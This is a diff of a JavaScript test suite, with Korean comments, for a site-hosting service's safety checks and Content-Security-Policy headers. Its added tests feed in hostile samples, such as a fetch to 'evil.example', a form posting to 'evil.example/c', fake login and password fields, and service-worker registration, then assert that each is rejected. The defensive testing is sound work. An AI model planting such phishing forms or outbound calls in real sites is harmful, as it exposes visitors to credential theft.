@@ -6,8 +6,9 @@ import assert from 'node:assert/strict';
 import { randomBytes } from 'node:crypto';
 import { existsSync } from 'node:fs';
 import { join } from 'node:path';
-import { HOSTING, buildSite, manifestOf, sha256, startHost, call, deploy } from './helpers.mjs';
+import { HOSTING, buildSite, aiSite, AI_SITE_JS, manifestOf, sha256, startHost, call, deploy } from './helpers.mjs';
 import { startFakeCf, ACCOUNT, TOKEN } from './fake-cf.mjs';
+import { siteCsp, auxCsp, LIB_SCRIPT_SOURCES } from '../src/csp.js';
 
 const ADMIN = 'it-admin-' + randomBytes(12).toString('hex');
 const te = new TextEncoder();
@@ -34,6 +35,7 @@ test('VIEW=pages: 만들기 → 검사·Pages 올리기 → 공개 → 다시 �
 
   const info = await call(base, 'GET', '/api/info');
   assert.equal(info.body.view, 'pages');
+  assert.equal(info.body.siteScripts, true, 'AI가 쓴 사이트 스크립트를 받음');
   assert.equal(info.body.keepAlive, false, 'Pages 보기는 방문으로 기간을 늘리지 않음');
   assert.equal(info.body.limits.days, 60, '기본 보관 기간 60일(마지막으로 배포한 날부터)');
 
@@ -46,11 +48,17 @@ test('VIEW=pages: 만들기 → 검사·Pages 올리기 → 공개 → 다시 �
   assert.equal(site.url, `${cf.url}/__view/s-${site.id}/`);
   assert.equal(site.altUrl, `${base}/s/${site.id}/`);
 
-  await t.test('올리기: 런타임이 아닌 .js는 Pages에 가기 전에 막음', async () => {
-    const bad = { ...files, 'assets/evil.js': te.encode('alert(1)') };
+  await t.test('올리기: 서비스 워커를 등록하는 사이트 스크립트는 Pages에 가기 전에 막음', async () => {
+    const evil = "navigator.serviceWorker.register('sw.js'); alert(1)";
+    const bad = { ...files, 'assets/evil.js': te.encode(evil) };
     const r = await deploy(base, site, bad);
-    assert.equal(r.step, 'blobs'); assert.equal(r.body.error.code, 'runtime_mismatch');
-    assert.ok(![...cf.state.assets.values()].some((a) => a.bytes.toString() === 'alert(1)'), '검사에 걸린 파일은 Pages에 올리지 않음');
+    assert.equal(r.step, 'blobs'); assert.equal(r.status, 422); assert.equal(r.body.error.code, 'unsafe_site'); assert.equal(r.body.error.rule, 'service_worker');
+    assert.equal(r.body.error.path, 'assets/evil.js'); assert.match(r.body.error.message_ko, /서비스 워커를 등록하는 코드가 있어요/);
+    assert.ok(![...cf.state.assets.values()].some((a) => a.bytes.toString() === evil), '검사에 걸린 파일은 Pages에 올리지 않음');
+    // 런타임처럼 시작하는데 다르면(손댄 런타임·앱과 서버의 판이 어긋남) 사이트 스크립트로 받지 않고 runtime_mismatch(앱: 새로 고친 뒤 다시)
+    const tampered = { ...files, 'assets/lecpage.js': te.encode(new TextDecoder().decode(files['assets/lecpage.js']) + '\n;fetch("https://evil.example/")') };
+    const r2 = await deploy(base, site, tampered);
+    assert.equal(r2.step, 'blobs'); assert.equal(r2.body.error.code, 'runtime_mismatch'); assert.equal(r2.body.error.path, 'assets/lecpage.js');
   });
 
   let first;
@@ -66,7 +74,8 @@ test('VIEW=pages: 만들기 → 검사·Pages 올리기 → 공개 → 다시 �
     assert.ok(m['/index.html'] && m['/robots.txt'] && m['/404.html'] && m['/assets/media/사진 (1).png'] && m['/assets/files/명단.csv']);
     assert.ok(!m['/assets/media/수업 영상.mp4'], '영상은 Pages에 올리지 않음');
     assert.ok(!m['/_headers'], '사이트가 보낸 _headers는 쓰지 않음');
-    assert.match(first.headers, /^\/\*\n {2}! Access-Control-Allow-Origin\n {2}Content-Security-Policy: default-src 'none'; script-src 'self';/);
+    assert.ok(first.headers.startsWith(`/*\n  ! Access-Control-Allow-Origin\n  Content-Security-Policy: ${siteCsp({ host: base, site: site.id, pages: true })}\n`), first.headers.slice(0, 600));
+    assert.ok(first.headers.includes(`/check\n  ! Content-Security-Policy\n  Content-Security-Policy: ${auxCsp()}\n`), '보조 쪽은 예전 CSP');
     assert.match(first.headers, /\/\*\.csv\n {2}Content-Disposition: attachment/);
     assert.match(first.headers, /\/console\n {2}X-Frame-Options: DENY/);
     assert.match(first.headers, /\/assets\/fonts\/\*\n {2}Cache-Control: public, max-age=31536000, immutable\n/, '이름이 내용 해시인 글꼴은 1년 캐시');
@@ -77,7 +86,7 @@ test('VIEW=pages: 만들기 → 검사·Pages 올리기 → 공개 → 다시 �
     assert.ok(page.text.includes(`href="${base}/report?site=${site.id}"`), '신고 링크는 호스트 주소로');
     assert.ok(page.text.includes(`<meta property="og:url" content="${site.url}">`), '미리보기 카드 주소는 Pages 주소');
     assert.ok(!/\?v=[0-9a-f]{12}/.test(page.text) && !page.text.includes('/rt/'), '지문·정적 사본 주소는 Worker 보기에서만');
-    assert.match(page.headers.get('content-security-policy'), /script-src 'self'/);
+    assert.equal(page.headers.get('content-security-policy'), siteCsp({ host: base, site: site.id, pages: true }));
     assert.equal(page.headers.get('access-control-allow-origin'), null);
     const robots = await get(`${site.url}robots.txt`);
     assert.ok(robots.text.includes('kakaotalk-scrap') && /User-agent: \*\nDisallow: \//.test(robots.text));
@@ -145,6 +154,65 @@ test('VIEW=pages: 만들기 → 검사·Pages 올리기 → 공개 → 다시 �
     assert.match(pre.headers.get('access-control-allow-headers'), /X-Lec-Token/);
     const evil = await fetch(`${base}/live/api/ABCD12/join`, { method: 'OPTIONS', headers: { origin: 'https://evil.example', 'access-control-request-method': 'POST' } });
     assert.equal(evil.headers.get('access-control-allow-origin'), null);
+  });
+
+  await t.test('AI가 직접 쓴 사이트(index.html + assets/style.css + assets/site.js + 키트 런타임): 받고, CSP 연결은 그 사이트의 방만', async () => {
+    const CODE = 'AI' + randomBytes(3).toString('hex').toUpperCase();
+    const s = (await call(base, 'POST', '/api/sites', { json: { title: 'AI 사이트' } })).body;
+    const ai = await aiSite({ live: { url: `${base}/live`, code: CODE } });
+    const bind = async () => { const b = await call(base, 'POST', `/api/sites/${s.id}/live`, { key: s.key, json: { code: CODE, adminKeyHash: sha256('ai-teacher-key-' + CODE) } }); assert.equal(b.status, 200, JSON.stringify(b.body)); };
+    const r = await deploy(base, s, ai, { beforePublish: bind });
+    assert.equal(r.status, 200, JSON.stringify(r.body));
+    const dep = cf.deploymentsOf(`s-${s.id}`).at(-1);
+    for (const p of ['/index.html', '/about.html', '/assets/style.css', '/assets/site.js', '/material/p-001.webp', '/assets/lecpage.js', '/console.html']) assert.ok(dep.manifest[p], p);
+    // _headers: 사이트 쪽 CSP(연결 = 이 출처 + 이 사이트의 방 경로), 보조 쪽은 예전 CSP
+    const want = siteCsp({ host: base, code: CODE, site: s.id, pages: true });
+    assert.ok(dep.headers.startsWith(`/*\n  ! Access-Control-Allow-Origin\n  Content-Security-Policy: ${want}\n`), dep.headers.slice(0, 900));
+    const connect = / connect-src ([^;]+);/.exec(want)[1].split(' ');
+    assert.deepEqual(connect, ["'self'", `${base}/live/api/${CODE}`, `${base}/live/api/${CODE}/`, `${base.replace(/^http/, 'ws')}/live/api/${CODE}/`, `${base}/api/${CODE}/files/`]);
+    assert.ok(want.includes(`script-src 'self' ${LIB_SCRIPT_SOURCES.join(' ')};`) && want.includes("worker-src 'none'") && want.includes("form-action 'none'") && want.includes('frame-src https://www.youtube-nocookie.com https://player.vimeo.com;'));
+    assert.ok(dep.headers.includes(`/console\n  X-Frame-Options: DENY\n  ! Content-Security-Policy\n  Content-Security-Policy: ${auxCsp({ noFrame: true })}\n`));
+    // 보기(Pages 출처 = 사이트마다 다른 출처): 사이트 스크립트를 그대로 내보냄, 고정 라이브러리는 남기고 바깥 스크립트는 뺌
+    const page = await get(s.url);
+    assert.equal(page.status, 200); assert.equal(page.headers.get('content-security-policy'), want);
+    assert.ok(page.text.includes('<script src="https://cdn.jsdelivr.net/npm/gsap@3.15.1/dist/gsap.min.js" defer></script>'), '고정 라이브러리는 남김');
+    assert.ok(!page.text.includes('evil.example'), '바깥 스크립트는 뺌');
+    assert.ok(page.text.includes('<script src="assets/site.js" defer></script>') && page.text.includes('data-host-report'));
+    const own = await get(`${s.url}assets/site.js`);
+    assert.equal(own.status, 200); assert.equal(own.text, AI_SITE_JS); assert.equal(own.headers.get('content-type'), 'text/javascript; charset=utf-8');
+    assert.equal((await get(`${s.url}console`)).headers.get('content-security-policy'), auxCsp({ noFrame: true }));
+    // 두 번째 주소(이 호스트, 모든 사이트가 같이 쓰는 출처): 사이트 스크립트는 내보내지 않고 엔진 런타임만
+    const alt = `${base}/s/${s.id}/`;
+    assert.equal((await get(alt)).status, 200);
+    for (const p of ['assets/site.js', 'assets/%73ite.js', 'assets/%2e/site.js', 'assets//site.js', 'assets/SITE.JS', 'assets/nope.js', 'x/../assets/site.js']) assert.equal((await get(alt + p)).status, 404, p);
+    const rt = await get(`${alt}assets/lecpage.js`);
+    assert.equal(rt.status, 200); assert.deepEqual(te.encode(rt.text), ai['assets/lecpage.js']);
+    assert.equal((await get(`${alt}assets/style.css`)).status, 200);
+  });
+
+  await t.test('AI가 쓴 사이트도 금지 모양은 공개 전에 거절(비밀번호 칸·바깥 양식·로그인 흉내·보조 쪽 스크립트·글자 가림)', async () => {
+    const s = (await call(base, 'POST', '/api/sites', { json: { title: '거절 시험' } })).body;
+    const ai = await aiSite();
+    const before = cf.deploymentsOf(`s-${s.id}`).length;
+    const withIndex = (extra) => ({ ...ai, 'index.html': te.encode(new TextDecoder().decode(ai['index.html']).replace('</main>', `${extra}</main>`)) });
+    for (const [f, rule, path] of [
+      [withIndex('<input type="password" name="pw">'), 'password', 'index.html'],
+      [withIndex('<form action="https://evil.example/c"><input name="q"><button>보내기</button></form>'), 'form', 'index.html'],
+      [withIndex('<input placeholder="아이디"><input placeholder="비번"><button>로그인</button>'), 'password_label', 'index.html'],
+      [withIndex('<input name="userid" placeholder="ID"><button type="submit">로그인</button>'), 'login', 'index.html'],
+      [{ ...ai, 'console.html': te.encode(new TextDecoder().decode(ai['console.html']).replace('</body>', '<script src="assets/site.js"></script></body>')) }, 'aux_script', 'console.html'],
+    ]) {
+      const r = await deploy(base, s, f);
+      assert.equal(r.step, 'publish', rule); assert.equal(r.status, 422, rule);
+      assert.equal(r.body.error.code, 'unsafe_site'); assert.equal(r.body.error.rule, rule); assert.equal(r.body.error.path, path);
+      assert.ok(/[가-힣]/.test(r.body.error.message_ko) && r.body.error.message_ko.includes(path), r.body.error.message_ko);
+    }
+    const css = await deploy(base, s, { ...ai, 'assets/style.css': te.encode('.pin{-webkit-text-security:disc}') });
+    assert.equal(css.step, 'blobs'); assert.equal(css.body.error.rule, 'masked');
+    const pw = await deploy(base, s, { ...ai, 'assets/site.js': te.encode("document.querySelector('input').type = 'password'") });
+    assert.equal(pw.step, 'blobs'); assert.equal(pw.body.error.rule, 'password');
+    assert.equal(cf.deploymentsOf(`s-${s.id}`).length, before, '걸린 사이트는 Pages에 배포하지 않음');
+    assert.equal((await deploy(base, s, ai)).status, 200, '고치면 받음');
   });
 
   await t.test('가리기·풀기·지우기(관리자 열쇠)', async () => {
